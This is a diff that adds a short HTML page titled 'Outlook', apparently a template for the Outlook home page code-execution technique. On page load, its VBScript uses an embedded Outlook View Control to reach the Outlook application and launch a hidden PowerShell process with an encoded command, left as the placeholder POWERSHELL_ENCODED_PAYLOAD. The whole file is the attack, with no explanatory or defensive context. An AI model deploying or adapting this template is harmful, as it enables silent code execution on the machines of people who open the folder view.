@@ -1,0 +1,20 @@
+<html>
+<head>
+<meta http-equiv="Content-Language" content="en-us">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>Outlook</title>
+<script id=clientEventHandlersVBS language=vbscript>
+<!--
+ Sub window_onload()
+    Set Application = ViewCtl1.OutlookApplication
+    Set objShell = Application.CreateObject("shell.application")
+    objShell.ShellExecute "powershell.exe ", "-nop -w hidden -encodedcommand POWERSHELL_ENCODED_PAYLOAD", "", "", 0
+    Set objShell = nothing
+ End Sub
+-->
+</script>
+</head>
+<body>
+ <object classid="clsid:0006F063-0000-0000-C000-000000000046" id="ViewCtl1" data="" width="100%" height="100%"></object>
+</body>
+</html>
